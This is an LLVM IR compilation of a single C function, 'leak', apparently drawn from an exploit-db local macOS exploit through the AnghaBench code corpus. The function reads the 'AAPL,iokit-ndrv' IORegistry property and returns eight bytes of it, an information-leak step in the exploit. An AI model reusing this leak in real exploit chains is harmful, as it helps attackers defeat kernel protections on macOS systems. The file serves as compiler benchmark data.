; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_35848.c_leak.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_35848.c_leak.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@kIOServicePlane = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [16 x i8] c"AAPL,iokit-ndrv\00", align 1
@kCFAllocatorDefault = common dso_local global i32 0, align 4
@kIORegistryIterateRecursively = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [17 x i8] c"expected CFData\0A\00", align 1
@.str.2 = private unnamed_addr constant [18 x i8] c"expected 8 bytes\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @leak() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = load i32, i32* @kIOMasterPortDefault, align 4
  %6 = call i32 @IORegistryGetRootEntry(i32 %5)
  %7 = load i32, i32* @kIOServicePlane, align 4
  %8 = call i32 @CFSTR(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  %9 = load i32, i32* @kCFAllocatorDefault, align 4
  %10 = load i32, i32* @kIORegistryIterateRecursively, align 4
  %11 = call i32 @IORegistryEntrySearchCFProperty(i32 %6, i32 %7, i32 %8, i32 %9, i32 %10)
  store i32 %11, i32* %3, align 4
  %12 = load i32, i32* %3, align 4
  %13 = call i64 @CFGetTypeID(i32 %12)
  %14 = call i64 (...) @CFDataGetTypeID()
  %15 = icmp ne i64 %13, %14
  br i1 %15, label %16, label %18

16:                                               ; preds = %0
  %17 = call i32 @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %30

18:                                               ; preds = %0
  %19 = load i32, i32* %3, align 4
  %20 = call i32 @CFDataGetLength(i32 %19)
  %21 = icmp ne i32 %20, 8
  br i1 %21, label %22, label %24

22:                                               ; preds = %18
  %23 = call i32 @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %30

24:                                               ; preds = %18
  %25 = load i32, i32* %3, align 4
  %26 = call i64 @CFDataGetBytePtr(i32 %25)
  %27 = inttoptr i64 %26 to i32*
  %28 = load i32, i32* %27, align 4
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %1, align 4
  br label %30

30:                                               ; preds = %24, %22, %16
  %31 = load i32, i32* %1, align 4
  ret i32 %31
}

declare dso_local i32 @IORegistryEntrySearchCFProperty(i32, i32, i32, i32, i32) #1

declare dso_local i32 @IORegistryGetRootEntry(i32) #1

declare dso_local i32 @CFSTR(i8*) #1

declare dso_local i64 @CFGetTypeID(i32) #1

declare dso_local i64 @CFDataGetTypeID(...) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @CFDataGetLength(i32) #1

declare dso_local i64 @CFDataGetBytePtr(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
